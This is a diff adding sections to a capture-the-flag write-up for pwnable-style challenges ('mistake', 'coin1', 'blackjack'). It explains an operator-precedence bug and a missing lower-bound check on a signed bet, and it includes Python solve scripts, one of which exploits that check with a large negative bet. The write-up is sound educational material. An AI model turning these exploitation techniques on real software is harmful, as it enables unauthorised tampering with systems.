@@ -323,3 +323,140 @@ Validating the equivalence comparison means inputting the value equal to the thr
 This program is relatively simple to understand once the bug is found.  It is clear that there is a mistake in the program based on the program name and prompt.  Identifying the bug can be done by either reviewing the source code, or by executing the binary and observing its behavior.  Running the program results in the process hanging, as if it is waiting for user input.  This is unexpected, as the program seemingly begins by reading the flag file and then prompting the user for input.  Because the prompt does not appear until after some user input is given, our preliminary understanding of the program is incorrect.  
 
 A quick search for the hint `operator priority` or compiling the source code with a rigorous compiler like `clang` gives hints as to what the issue is.  ![This guide](https://www.tutorialspoint.com/cprogramming/c_operators_precedence.htm) shows that the relational operators `< <= > >=` are given higher precedence (operated upon prior to) the assignment operator `=`.  This means the first line in `main()`, `if(fd=open("./password",O_RDONLY,0400) < 0)`, will first compare the return value (`fd`) returned by `open()` to 0.  Since the file is opened and returned a `fd`, the comparison will return a False (`0`) value.  This means that the `fd=` assignment will store `0` as the file descriptor later used to load `pw_buf`.  The subsequent command `read(fd,pw_buf,PW_LEN)` will effectively read data from file descriptor `0` (stdin) as the password.  This means we control both the password and the user input which is xor-d and compared to the password.  We can choose easy values for the two inputs, such as `BBBBBBBBBB` and `CCCCCCCCCC`, since B (0x41) xor 0x1 is C (0x42).  This passes the check and returns the flag.
+
+### coin1
+This is not an exploitation challenge but rather a programming challenge. The program allows a certain number of guesses as to which specific index of `n` coins is fake.  The number of guesses is not arbitrary, it is always greater than or equal to the `log_2(n)`.  This allows us to write a brief binary search program that weighs the first half of the `n` coins to determine if the fake coin is in that half.  The search then continues in the half that is confirmed to hold the fake coin. The most difficult part of this challenge is handling a sometimes quirky I/O interface, which occassionally requires the user to input the fake coin two times in a row once it is identified with a weight of nine.  The following code performs the binary search and iterates over subsequent challenges when the first problem is solved: 
+
+```python
+def exploit(): 
+  def get_result():
+    resp = p.recvline()
+    if resp[0:8] == b"Correct!":
+      return 1
+    return resp
+
+  def get_results(start, mid):
+    resp = p.recvline()
+    if resp[:8] == b"Correct!":
+      print(resp)
+      return 9
+    w = int(resp.strip())
+    if w == 9:
+      p.send(str(start).encode("utf-8") + b'\n')
+      resp = p.recvline()
+      while(resp[0:8] != b"Correct!"):
+        p.send(str(start).encode("utf-8") + b'\n')
+        resp = p.recvline()
+      print(resp)
+      return 9
+    if w < (mid - start) * 10:
+      return 1
+    else:
+      return 0
+
+  def solve(n, c):
+    # pause()
+    start = 0
+    end = n
+    mid = n // 2
+    while True:
+      query = b""
+      for num in range(start, mid):
+        query += str(num).encode("utf-8") + b" "
+      query = query[:-1] + b'\n'
+      p.send(query)
+      res = get_results(start, mid)
+      if res == 9:
+        break
+      if res == 1:
+        end = mid
+        mid = (end-start) // 2 + start
+      else:
+        start = mid
+        mid = (end - start) // 2 + start
+        if mid == start: # handle last edge case
+          mid += 1
+          
+  # exploit starts here 
+  p = binary_connect()
+  p.recvuntil("3 sec... -\n\t\n")
+  time.sleep(3.5)
+  while True:
+    line = p.recvline().decode("utf-8")
+    try:
+      n = int(line.split(" ")[0].split("=")[1])
+      c = int(line.split(" ")[1].split("=")[1])
+    except:
+      print(line)
+    solve(n, c)
+```
+
+Note that the flag is returned when 100 challenges are solved.  There are some instances where the connection speed external to the pwnable server causes enough lag that fewer than 100 challenges are solved.  Running again was sufficient to return the flag.
+
+### blackjack
+This challenge has a simple vulnerability, but a larger code base that can be used to confuse and deviate the challenger.  One issue that initially led me awry is an incorrect use of `srand((unsigned) time(NULL));`.  This is used to seed the `rand` function, but is done so every time a new number is generated.  The resulting problem is that the seed is identical within the same one second interval.  This then returns deterministic cards within that interval. While this is an error that can potentially be exploited, there is a much worse error in the program.  
+
+The source code shows that the `bet` value is a signed integer and no lower bound check is implemented.  Furthermore, the `cash` amount is determined through simple addition and subtraction of the `bet` depending on the outcome.  This means we can bet an arbitrary large negative value (within the bounds of an `int` data type) and intentionally lose to build our `cash` to $1M.  The following code performs this task and retrieves the flag after intentionally losing.  *Note: this exploit only fails if we happen to land on 21, which is rather unlikely.*
+
+```python
+def exploit():
+  def make_bet():
+    p.recvuntil(b"Enter Bet: $")
+    p.send(b"-10000000\n")
+
+  def get_cash():
+    cash = p.recvline().strip().split(b" $")[1]
+    print("Cash: " + cash.decode("utf-8"))
+    return int(cash.decode("utf-8"))
+
+  def get_total():
+    p.recvuntil(b"Your Total is ")
+    total = p.recvline().strip()
+    print("Total: " + total.decode("utf-8"))
+    return int(total.decode("utf-8"))
+
+  def get_dealer():
+    p.recvuntil(b"The Dealer Has a Total of ")
+    dealer = p.recvline().strip() 
+    print("Dealer: " + dealer.decode("utf-8"))
+    return int(dealer.decode("utf-8"))
+
+  def hit_or_stay(decision):
+    p.recvuntil(b"Hit or S to Stay.\n")
+    if decision == "hit":
+      p.send(b"H\n")
+    else: 
+      p.send(b"S\n")
+
+  def wait():
+    t = datetime.datetime.utcnow()
+    sleeptime = (t.second + t.microsecond/1000000.) % 1 + .2
+    print("waiting " + str(sleeptime) + " seconds")
+    time.sleep(sleeptime)
+
+  def start_hand():
+    p.recvline()
+    get_cash()
+    total = get_total()
+    dealer = get_dealer()
+    make_bet()
+    while True:
+      hit_or_stay("hit")
+      my_total = get_total()
+      dealer_total = get_dealer()
+      if my_total >= 21 or dealer_total >= 21:
+        break
+      
+    p.recvuntil(b"Please Enter Y for Yes or N for No\n")
+    p.send(b'Y\n')
+
+  # exploit starts here
+  p = binary_connect()
+  p.recvuntil(b"Y/N)\n")
+  p.recv()
+  p.send(b"Y")
+  p.recvuntil(b"Choice: ")
+  p.send(b"1\n")
+  start_hand()
+  print(p.recvline())
+```
